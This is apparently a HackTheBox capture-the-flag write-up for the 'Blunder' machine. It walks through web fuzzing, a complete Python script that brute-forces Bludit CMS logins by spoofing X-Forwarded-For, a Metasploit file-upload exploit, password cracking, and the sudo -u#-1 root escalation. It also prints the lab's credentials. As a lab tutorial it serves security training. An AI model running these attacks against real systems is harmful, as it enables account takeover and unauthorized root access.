@@ -1,0 +1,246 @@
+I"S1<p><img src="/assets/img/htb-machines/blunder-main.png" alt="Desktop View" /></p>
+
+<hr />
+
+<p><strong><span style="color:#ff5555">Introduction</span></strong></p>
+
+<hr />
+
+<p>Blunder machine released on 30 May 2020 on HackTheBox platform and created by <a href="https://www.hackthebox.eu/home/users/profile/94858">egotisticalSW</a>.
+It’s nice machine which hosted CMS named Bludit. So let’s move forward and p4wn this awesome box.</p>
+
+<p><span style="color:#ff5555">This blog is meant for educational purposes only.</span></p>
+
+<hr />
+
+<p><strong><span style="color:#ff5555">Port &amp; Service Enumeration</span></strong></p>
+
+<hr />
+
+<p><code class="language-plaintext highlighter-rouge">root@kali:~sudo nmap -sV -sC -T4 10.10.10.191</code></p>
+
+<p><img src="/assets/img/htb-machines/blunder-nmap.png" alt="Desktop View" /></p>
+
+<p>We used -sC for Default Script, -sV Service Version Scan, -p- for All Ports and -T4 for Timing. As you can see there are two ports open that is port 21 and 80. Port 21 was ftp but closed and port 80 has hosted webserver which has Apache httpd 2.4.41 also the OS was Ubuntu, so we moved towards port 80 for further enumeration.</p>
+
+<hr />
+
+<p><strong><span style="color:#ff5555">Web Enumeration</span></strong></p>
+
+<hr />
+
+<p>After opening the the website in browser we found that it was using Bludit CMS.</p>
+
+<p><img src="/assets/img/htb-machines/blunder-cms.png" alt="Desktop View" /></p>
+
+<p>Continuing to enumeration we started fuzzing the web directory using Ffuf tool.</p>
+
+<p><img src="/assets/img/htb-machines/blunder-ffuf.png" alt="Desktop View" /></p>
+
+<p>After doing some web fuzzing, We found admin panel of Bludit CMS hosted on url <a href="http://10.10.10.191/admin/">http://10.10.10.191/admin/</a></p>
+
+<p><img src="/assets/img/htb-machines/blunder-cms-admin.png" alt="Desktop View" /></p>
+
+<p>As we don’t know the username and password of this admin panel, We continued fuzzing on website using Ffuf and some common extensions like php, txt etc.</p>
+
+<p><img src="/assets/img/htb-machines/blunder-ffuf-1.png" alt="Desktop View" /></p>
+
+<p>After some fuzzing we got one todo.txt file hosted on webserver which has one note “Inform fergus that the new blog needs images - PENDING”</p>
+
+<p>So here we got the one of the user’s username that is “fergus”</p>
+
+<p>We found the user but we don’t know the password so, For password we used one tool called “CeWl”.</p>
+
+<p>So basically what this tool does, It generates wordlist from any url/webpage.
+In our case, We used this tool on webpase and generated wordlist.</p>
+
+<p>cewl http://10.10.10.191/</p>
+
+<p><img src="/assets/img/htb-machines/blunder-cewl.png" alt="Desktop View" /></p>
+
+<p>Nice, CeWl generated more than 300 passwords.
+Now we have username and wordlist of passwords, Let’s move forward.</p>
+
+<p>After doing some google about Bludit CMS, We found that Bludit CMS was vulnerable for password bruteforce attack.</p>
+
+<p>Checking one <a href="https://github.com/bludit/bludit/pull/1090">issue</a> on Github about Bludit, We got one python script to bruteforce the password.</p>
+
+<p>To bruteforce the password We needed to modify the script.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+</pre></td><td class="rouge-code"><pre><span class="c1">#!/usr/bin/env python3
+</span><span class="kn">import</span> <span class="nn">re</span>
+<span class="kn">import</span> <span class="nn">requests</span>
+<span class="c1">#from future import print_function
+</span>
+<span class="k">def</span> <span class="nf">open_ressources</span><span class="p">(</span><span class="n">file_path</span><span class="p">):</span>
+    <span class="k">return</span> <span class="p">[</span><span class="n">item</span><span class="p">.</span><span class="n">replace</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="s">""</span><span class="p">)</span> <span class="k">for</span> <span class="n">item</span> <span class="ow">in</span> <span class="nb">open</span><span class="p">(</span><span class="n">file_path</span><span class="p">).</span><span class="n">readlines</span><span class="p">()]</span>
+
+<span class="n">host</span> <span class="o">=</span> <span class="s">'http://10.10.10.191'</span>
+<span class="n">login_url</span> <span class="o">=</span> <span class="n">host</span> <span class="o">+</span> <span class="s">'/admin/login'</span>
+<span class="n">username</span> <span class="o">=</span> <span class="s">'fergus'</span>
+<span class="n">wordlist</span> <span class="o">=</span> <span class="n">open_ressources</span><span class="p">(</span><span class="s">'/home/sujit/Desktop/HTB/Blunder/pass.txt'</span><span class="p">)</span>
+
+<span class="k">for</span> <span class="n">password</span> <span class="ow">in</span> <span class="n">wordlist</span><span class="p">:</span>
+    <span class="n">session</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">Session</span><span class="p">()</span>
+    <span class="n">login_page</span> <span class="o">=</span> <span class="n">session</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="n">login_url</span><span class="p">)</span>
+    <span class="n">csrf_token</span> <span class="o">=</span> <span class="n">re</span><span class="p">.</span><span class="n">search</span><span class="p">(</span><span class="s">'input.+?name="tokenCSRF".+?value="(.+?)"'</span><span class="p">,</span> <span class="n">login_page</span><span class="p">.</span><span class="n">text</span><span class="p">).</span><span class="n">group</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+
+    <span class="k">print</span><span class="p">(</span><span class="s">'[*] Trying: {p}'</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">p</span> <span class="o">=</span> <span class="n">password</span><span class="p">))</span>
+
+    <span class="n">headers</span> <span class="o">=</span> <span class="p">{</span>
+        <span class="s">'X-Forwarded-For'</span><span class="p">:</span> <span class="n">password</span><span class="p">,</span>
+        <span class="s">'User-Agent'</span><span class="p">:</span> <span class="s">'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36'</span><span class="p">,</span>
+        <span class="s">'Referer'</span><span class="p">:</span> <span class="n">login_url</span>
+    <span class="p">}</span>
+
+    <span class="n">data</span> <span class="o">=</span> <span class="p">{</span>
+        <span class="s">'tokenCSRF'</span><span class="p">:</span> <span class="n">csrf_token</span><span class="p">,</span>
+        <span class="s">'username'</span><span class="p">:</span> <span class="n">username</span><span class="p">,</span>
+        <span class="s">'password'</span><span class="p">:</span> <span class="n">password</span><span class="p">,</span>
+        <span class="s">'save'</span><span class="p">:</span> <span class="s">''</span>
+    <span class="p">}</span>
+
+    <span class="n">login_result</span> <span class="o">=</span> <span class="n">session</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="n">login_url</span><span class="p">,</span> <span class="n">headers</span> <span class="o">=</span> <span class="n">headers</span><span class="p">,</span> <span class="n">data</span> <span class="o">=</span> <span class="n">data</span><span class="p">,</span> <span class="n">allow_redirects</span> <span class="o">=</span> <span class="bp">False</span><span class="p">)</span>
+
+    <span class="k">if</span> <span class="s">'location'</span> <span class="ow">in</span> <span class="n">login_result</span><span class="p">.</span><span class="n">headers</span><span class="p">:</span>
+        <span class="k">if</span> <span class="s">'/admin/dashboard'</span> <span class="ow">in</span> <span class="n">login_result</span><span class="p">.</span><span class="n">headers</span><span class="p">[</span><span class="s">'location'</span><span class="p">]:</span>
+            <span class="k">print</span><span class="p">()</span>
+            <span class="k">print</span><span class="p">(</span><span class="s">'SUCCESS: Password found!'</span><span class="p">)</span>
+            <span class="k">print</span><span class="p">(</span><span class="s">'Use {u}:{p} to login.'</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">u</span> <span class="o">=</span> <span class="n">username</span><span class="p">,</span> <span class="n">p</span> <span class="o">=</span> <span class="n">password</span><span class="p">))</span>
+            <span class="k">print</span><span class="p">()</span>
+            <span class="k">break</span>
+
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>In above code, I used pass.txt file as wordlist and username as “fergus”</p>
+
+<p><img src="/assets/img/htb-machines/blunder-bruteforce-1.png" alt="Desktop View" /></p>
+
+<p>After bruteforce, We got the password of user “fergus” as “RolandDeschain”</p>
+
+<p><img src="/assets/img/htb-machines/blunder-bruteforce-2.png" alt="Desktop View" /></p>
+
+<p>Now we have both username and password.
+Let’s login with username as “fergus” and password as  “RolandDeschain”</p>
+
+<p><img src="/assets/img/htb-machines/blunder-bludit-login.png" alt="Desktop View" /></p>
+
+<p>We successfully logged in into Bludit CMS.</p>
+
+<hr />
+
+<p><strong><span style="color:#ff5555">Initial Shell</span></strong></p>
+
+<hr />
+
+<p>After some Google, I found that there is file upload vulnerability available for Bludit CMS and also there is metasploit module available for the same.</p>
+
+<p>Name of the Metasploit module : linux/http/bludit_upload_images_exec</p>
+
+<p>Lets fire up metasploit and use the above exploit.</p>
+
+<p>We need to set some required data (option) for this exploit.</p>
+
+<p><img src="/assets/img/htb-machines/blunder-metasploit.png" alt="Desktop View" /></p>
+
+<p>Here I set BLUIDITPASS, BLUIDITUSER, RHOSTS, LHOST options respectively to exploit the vulnerability.</p>
+
+<p>After setting up options I ran exploit command to run the exploit and voila!!!, We got initial shell..</p>
+
+<p><img src="/assets/img/htb-machines/blunder-metasploit-1.png" alt="Desktop View" /></p>
+
+<hr />
+
+<p><strong><span style="color:#ff5555">Privilege Escalation: User</span></strong></p>
+
+<hr />
+
+<p>Now let’s start enumeration to get user.</p>
+
+<p>While doing enumeration, I checked some documentation of Bludit CMS in which I found that the CMS had database folder.</p>
+
+<p><img src="/assets/img/htb-machines/blunder-cms-structure.png" alt="Desktop View" /></p>
+
+<p>In this database folder I got one PHP file named users.php which contains password hash of another user “hugo”</p>
+
+<p><img src="/assets/img/htb-machines/blunder-password-hash.png" alt="Desktop View" /></p>
+
+<p>After using online password cracker, I got “Password120” as password for user “hugo”</p>
+
+<p><img src="/assets/img/htb-machines/blunder-password-hash-1.png" alt="Desktop View" /></p>
+
+<p>After login using above password I was able to get user successfully.</p>
+
+<p><img src="/assets/img/htb-machines/blunder-user.png" alt="Desktop View" /></p>
+
+<p>Here we got user.txt.</p>
+
+<hr />
+
+<p><strong><span style="color:#ff5555">Privilege Escalation: Root</span></strong></p>
+
+<hr />
+
+<p>Now it’s time for root.</p>
+
+<p>I ran sudo -l to list out what is allowed to run as sudo without password</p>
+
+<p><img src="/assets/img/htb-machines/blunder-privesc.png" alt="Desktop View" /></p>
+
+<p>Here the user was allowed to run /bin/bash without password.</p>
+
+<p>I used sudo -u#-1 bash command to get into root.</p>
+
+<p>The above command will trigger -1 user which is not there so we will get a root shell directly.</p>
+
+<p>You’ll get more information about this PrivEsc vulnerability <a href="https://www.sudo.ws/alerts/minus_1_uid.html">here</a>.</p>
+
+<p><img src="/assets/img/htb-machines/blunder-root.png" alt="Desktop View" /></p>
+
+<p>And here we rooted Blunder successfully.</p>
+
+<p><span style="color:#ff5555"><strong>Thanks for reading this writeup and all suggestions are welcome.</strong></span></p>
+:ET
